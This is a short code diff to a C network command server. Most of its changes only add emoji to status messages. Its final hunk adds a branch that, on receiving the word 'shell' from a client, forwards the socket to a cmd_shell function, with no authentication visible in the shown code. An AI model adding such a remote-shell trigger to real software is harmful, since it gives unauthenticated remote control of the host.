@@ -38,10 +38,10 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
 
     if (!net_init(callback_netclient)) { // Initialize network communication
-        fprintf(stderr, "Failed to initialize network communication.\n");
+        fprintf(stderr, "❌ Failed to initialize network communication.\n");
         return EXIT_FAILURE;
     }
-    printf("Network communication initialized successfully.\n");
+    printf("✅ Network communication initialized successfully.\n");
 
     return EXIT_SUCCESS; // Exit successfully if everything is initialized
 }
@@ -50,17 +50,17 @@ int main(int argc, char *argv[]) {
 bool run_tests() {
     // Test cmd feature
     if (!test_cmd_feature()) {
-        fprintf(stderr, "Command feature tests failed.\n");
+        fprintf(stderr, "❌ Command feature tests failed.\n");
         return false;
     }
-    printf("Command feature tests passed.\n");
+    printf("✅ Command feature tests passed.\n");
 
     // Test net feature
     if (!test_net_feature()) {
-        fprintf(stderr, "Network feature tests failed.\n");
+        fprintf(stderr, "❌ Network feature tests failed.\n");
         return false;
     }
-    printf("Network feature tests passed.\n");
+    printf("✅ Network feature tests passed.\n");
 
     return true; // All tests passed
 }
@@ -90,6 +90,11 @@ void callback_netclient(int client_socket) {
             printf("Client requested to exit. Closing connection.\n");
             close(client_socket);
             return;
+        }
+
+        if (strncmp(buffer, "shell", 5) == 0) {
+            printf("Client requested to open shell. Forwarding.\n");
+            cmd_shell(client_socket);
         }
 
         // this is the part where I execute commands
